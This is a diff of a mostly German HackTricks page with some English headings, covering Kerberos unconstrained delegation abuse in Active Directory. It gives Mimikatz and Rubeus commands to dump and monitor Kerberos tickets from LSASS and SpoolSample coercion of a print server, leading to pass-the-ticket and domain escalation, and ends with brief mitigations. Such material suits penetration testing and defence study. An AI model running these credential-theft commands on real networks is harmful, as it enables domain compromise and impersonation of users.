@@ -1,48 +1,51 @@
-# Unbeschränkte Delegation
+# Unconstrained Delegation
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
-* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud) senden**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Unbeschränkte Delegation
+## Unconstrained delegation
 
-Dies ist eine Funktion, die ein Domänenadministrator für jeden **Computer** in der Domäne festlegen kann. Jedes Mal, wenn sich ein **Benutzer anmeldet** und auf den Computer zugreift, wird eine **Kopie des TGTs** dieses Benutzers an den TGS gesendet, der vom DC bereitgestellt wird, und im LSASS im Speicher gespeichert. Wenn Sie Administratorrechte auf dem Computer haben, können Sie die Tickets abrufen und die Benutzer auf jedem Computer imitieren.
+Dies ist eine Funktion, die ein Domänenadministrator für jeden **Computer** innerhalb der Domäne festlegen kann. Jedes Mal, wenn sich ein **Benutzer** an dem Computer anmeldet, wird eine **Kopie des TGT** dieses Benutzers in das **TGS** gesendet, das vom DC bereitgestellt wird, **und im Speicher in LSASS gespeichert**. Wenn Sie also Administratorrechte auf der Maschine haben, können Sie die **Tickets dumpen und die Benutzer** auf jeder Maschine impersonieren.
 
-Wenn sich also ein Domänenadministrator auf einem Computer mit aktivierter "Unbeschränkter Delegation" anmeldet und Sie lokale Administratorrechte auf diesem Computer haben, können Sie das Ticket abrufen und den Domänenadministrator überall imitieren (Domänenprivilegierung).
+Wenn sich also ein Domänenadministrator an einem Computer mit aktivierter Funktion "Unconstrained Delegation" anmeldet und Sie lokale Administratorrechte auf dieser Maschine haben, können Sie das Ticket dumpen und den Domänenadministrator überall impersonieren (Domänenprivilegieneskalation).
 
-Sie können **Computerobjekte mit diesem Attribut finden**, indem Sie überprüfen, ob das [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx)-Attribut [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) enthält. Dies können Sie mit einem LDAP-Filter von '(userAccountControl:1.2.840.113556.1.4.803:=524288)' tun, was Powerview tut:
+Sie können **Computerobjekte mit diesem Attribut finden**, indem Sie überprüfen, ob das Attribut [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) enthält. Sie können dies mit einem LDAP-Filter von ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ tun, was powerview macht:
 
-<pre class="language-bash"><code class="lang-bash"># Liste der Computer ohne Einschränkungen
+<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
 ## Powerview
-Get-NetComputer -Unconstrained #DCs erscheinen immer, sind aber für Privilegierung nicht nützlich
+Get-NetComputer -Unconstrained #DCs erscheinen immer, sind aber für privesc nicht nützlich
 <strong>## ADSearch
 </strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
-<strong># Tickets mit Mimikatz exportieren
+<strong># Export tickets with Mimikatz
 </strong>privilege::debug
 sekurlsa::tickets /export #Empfohlene Methode
 kerberos::list /export #Eine andere Methode
 
-# Anmeldungen überwachen und neue Tickets exportieren
-.\Rubeus.exe monitor /targetuser:&#x3C;Benutzername> /interval:10 #Alle 10 Sekunden nach neuen TGTs suchen</code></pre>
+# Monitor logins and export new tickets
+.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Überprüfen Sie alle 10s auf neue TGTs</code></pre>
 
-Laden Sie das Ticket des Administrators (oder des Opferbenutzers) mit **Mimikatz** oder **Rubeus für ein** [**Pass the Ticket**](pass-the-ticket.md)** in den Speicher**.\
+Laden Sie das Ticket des Administrators (oder des Opferbenutzers) im Speicher mit **Mimikatz** oder **Rubeus für ein** [**Pass the Ticket**](pass-the-ticket.md)**.**\
 Weitere Informationen: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
-[**Weitere Informationen zur unbeschränkten Delegation auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
+[**Weitere Informationen zur Unconstrained Delegation bei ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
 
-### **Erzwinge Authentifizierung**
+### **Force Authentication**
 
-Wenn ein Angreifer in der Lage ist, einen für "Unbeschränkte Delegation" zugelassenen Computer zu **kompromittieren**, könnte er einen **Druckserver dazu bringen, sich automatisch** gegen ihn **anzumelden** und ein TGT im Speicher des Servers zu speichern.\
-Dann könnte der Angreifer einen **Pass-the-Ticket-Angriff durchführen, um** das Benutzerkonto des Druckservers zu imitieren.
+Wenn ein Angreifer in der Lage ist, einen Computer zu **kompromittieren, der für "Unconstrained Delegation" erlaubt ist**, könnte er einen **Druckserver** **täuschen**, um sich **automatisch** bei ihm **anzumelden und ein TGT** im Speicher des Servers zu speichern.\
+Dann könnte der Angreifer einen **Pass the Ticket-Angriff durchführen, um** das Benutzerkonto des Druckservercomputers zu impersonieren.
 
-Um einen Druckserver zur Anmeldung an einem beliebigen Computer zu bringen, können Sie [**SpoolSample**](https://github.com/leechristensen/SpoolSample) verwenden:
+Um einen Druckserver dazu zu bringen, sich an einer beliebigen Maschine anzumelden, können Sie [**SpoolSample**](https://github.com/leechristensen/SpoolSample) verwenden:
 ```bash
 .\SpoolSample.exe <printmachine> <unconstrinedmachine>
 ```
@@ -55,19 +58,22 @@ Wenn das TGT von einem Domänencontroller stammt, könnten Sie einen [**DCSync-A
 [printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
 {% endcontent-ref %}
 
-### Abhilfe
+### Minderung
 
-* Begrenzen Sie DA/Admin-Anmeldungen auf bestimmte Dienste.
-* Setzen Sie "Konto ist sensibel und kann nicht weitergeleitet werden" für privilegierte Konten.
+* Begrenzen Sie DA/Admin-Anmeldungen auf bestimmte Dienste
+* Setzen Sie "Konto ist sensibel und kann nicht delegiert werden" für privilegierte Konten.
+
+{% hint style="success" %}
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family).
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com).
-* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud) senden**.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
+{% endhint %}
